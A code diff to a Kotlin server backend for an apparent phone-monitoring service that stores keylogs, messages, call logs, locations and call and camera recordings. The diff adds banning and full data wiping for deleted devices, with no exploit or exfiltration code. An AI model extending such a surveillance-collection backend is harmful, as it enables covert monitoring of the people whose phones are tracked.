@@ -62,6 +62,10 @@ val dashboardSessions = ConcurrentHashMap<WebSocketSession, Int>()
 // deviceId -> ownerId cache (avoids repeated DB lookups)
 val deviceOwnerCache = ConcurrentHashMap<String, Int>()
 
+// Permanently deleted (banned) device IDs — loaded from DB on startup.
+// Devices in this set are rejected on WebSocket connect so they can never re-register.
+val bannedDeviceIds = ConcurrentHashMap.newKeySet<String>()
+
 // deviceId -> last connection timestamp (debounce rapid reconnects)
 val deviceConnectTimestamps = ConcurrentHashMap<String, Long>()
 
@@ -329,6 +333,14 @@ object KeylogTable : Table("keylog") {
     override val primaryKey = PrimaryKey(id)
 }
 
+// Permanently deleted device IDs. A device present here is rejected on WebSocket
+// connect so it can never re-register under any account.
+object BannedDevicesTable : Table("banned_devices") {
+    val deviceId  = varchar("device_id", 50)
+    val deletedAt = long("deleted_at")
+    override val primaryKey = PrimaryKey(deviceId)
+}
+
 // Single-row table (id is always 1) storing the public landing page content as a JSON blob.
 // Kept schema-free on purpose so admin-landing.js can add/edit fields without migrations.
 object LandingContentTable : Table("landing_content") {
@@ -552,13 +564,18 @@ fun initDatabase() {
 
     transaction {
         SchemaUtils.create(UsersTable, SessionsTable, DevicesTable, TelemetryTable, LocationHistoryTable, LogsTable, MessagesTable, LandingContentTable, ContactsTable, CallLogsTable, KeylogTable,
-            PlansTable, SubscriptionsTable, PaymentsTable, AppSettingsTable, SuperAdminTable, SuperAdminSessionsTable)
+            PlansTable, SubscriptionsTable, PaymentsTable, AppSettingsTable, SuperAdminTable, SuperAdminSessionsTable, BannedDevicesTable)
         SchemaUtils.createMissingTablesAndColumns(UsersTable, DevicesTable, MessagesTable, ContactsTable, CallLogsTable, KeylogTable,
-            PlansTable, SubscriptionsTable, PaymentsTable, AppSettingsTable, SuperAdminTable, SuperAdminSessionsTable, LocationHistoryTable) // migrate new columns on existing installs
+            PlansTable, SubscriptionsTable, PaymentsTable, AppSettingsTable, SuperAdminTable, SuperAdminSessionsTable, LocationHistoryTable, BannedDevicesTable) // migrate new columns on existing installs
 
         // Reset all devices to offline state initially on server start
         DevicesTable.update {
             it[DevicesTable.isOnline] = false
+        }
+
+        // Load banned device IDs into memory for fast rejection on WebSocket connect
+        BannedDevicesTable.selectAll().forEach { row ->
+            bannedDeviceIds.add(row[BannedDevicesTable.deviceId])
         }
 
         // Seed the landing page content row on first boot
@@ -2102,6 +2119,13 @@ fun main() {
                 val deviceId   = call.parameters["id"] ?: "unknown"
                 val linkToken  = call.request.queryParameters["linkToken"]?.trim()
 
+                // Reject permanently deleted devices — they must never re-register.
+                if (deviceId in bannedDeviceIds) {
+                    println("WS: rejected banned device $deviceId")
+                    close(CloseReason(CloseReason.Codes.VIOLATED_POLICY, "Device permanently deleted"))
+                    return@webSocket
+                }
+
                 // Close any previous live session for this device before taking over —
                 // otherwise the old (possibly stale) socket lingers until its own timeout.
                 deviceSessions[deviceId]?.let { old ->
@@ -2753,7 +2777,26 @@ fun main() {
 
                 deviceSessions.remove(deviceId)
                 deviceOwnerCache.remove(deviceId)
-                transaction { DevicesTable.deleteWhere { DevicesTable.id eq deviceId } }
+
+                // ── Permanent deletion: wipe ALL data linked to this device ──────────
+                transaction {
+                    // 1. Register as banned so reconnections are rejected immediately
+                    BannedDevicesTable.upsert {
+                        it[BannedDevicesTable.deviceId]  = deviceId
+                        it[BannedDevicesTable.deletedAt] = System.currentTimeMillis()
+                    }
+                    // 2. Delete from every table that stores device data
+                    MessagesTable.deleteWhere        { MessagesTable.deviceId eq deviceId }
+                    ContactsTable.deleteWhere        { ContactsTable.deviceId eq deviceId }
+                    CallLogsTable.deleteWhere        { CallLogsTable.deviceId eq deviceId }
+                    KeylogTable.deleteWhere          { KeylogTable.deviceId eq deviceId }
+                    TelemetryTable.deleteWhere       { TelemetryTable.deviceId eq deviceId }
+                    LocationHistoryTable.deleteWhere { LocationHistoryTable.deviceId eq deviceId }
+                    LogsTable.deleteWhere            { LogsTable.deviceId eq deviceId }
+                    DevicesTable.deleteWhere         { DevicesTable.id eq deviceId }
+                }
+                // Add to in-memory set so any concurrent/future WS connection is rejected instantly
+                bannedDeviceIds.add(deviceId)
 
                 // Clean up R2 / local storage files for the deleted device
                 val allMediaTypes = listOf("photos", "audio", "screenshots", "screen-recordings", "camera-recordings", "call-recordings")
@@ -2762,16 +2805,22 @@ fun main() {
                     try {
                         for (t in allMediaTypes) {
                             val prefix = "uploads/$deviceId/$t/"
-                            val listReq = ListObjectsV2Request.builder().bucket(r2BucketName).prefix(prefix).build()
-                            val objects = s3.listObjectsV2(listReq).contents()
-                            if (objects.isNotEmpty()) {
-                                val identifiers = objects.map { ObjectIdentifier.builder().key(it.key()).build() }
-                                val delReq = DeleteObjectsRequest.builder()
-                                    .bucket(r2BucketName)
-                                    .delete(software.amazon.awssdk.services.s3.model.Delete.builder().objects(identifiers).build())
-                                    .build()
-                                s3.deleteObjects(delReq)
-                            }
+                            var continuationToken: String? = null
+                            do {
+                                val reqBuilder = ListObjectsV2Request.builder().bucket(r2BucketName).prefix(prefix)
+                                if (continuationToken != null) reqBuilder.continuationToken(continuationToken)
+                                val resp = s3.listObjectsV2(reqBuilder.build())
+                                val objects = resp.contents()
+                                if (objects.isNotEmpty()) {
+                                    val identifiers = objects.map { ObjectIdentifier.builder().key(it.key()).build() }
+                                    val delReq = DeleteObjectsRequest.builder()
+                                        .bucket(r2BucketName)
+                                        .delete(software.amazon.awssdk.services.s3.model.Delete.builder().objects(identifiers).build())
+                                        .build()
+                                    s3.deleteObjects(delReq)
+                                }
+                                continuationToken = if (resp.isTruncated == true) resp.nextContinuationToken() else null
+                            } while (continuationToken != null)
                         }
                     } catch (e: Exception) {
                         println("R2: Failed to clean up storage for deleted device $deviceId: ${e.message}")
@@ -2781,10 +2830,7 @@ fun main() {
                     if (uploadDir.exists()) uploadDir.deleteRecursively()
                 }
 
-                // O linkToken do usuário permanece o mesmo — o código do painel é
-                // um identificador estável da conta, não do aparelho. O dispositivo
-                // excluído fica desconectado; se o app reconectar com o mesmo token
-                // ele volta a aparecer no painel (comportamento desejado para rastreamento).
+                println("DEVICE DELETED: $deviceId — all data wiped and device banned from re-registration")
                 call.respondText(
                     """{"ok":true}""",
                     io.ktor.http.ContentType.Application.Json
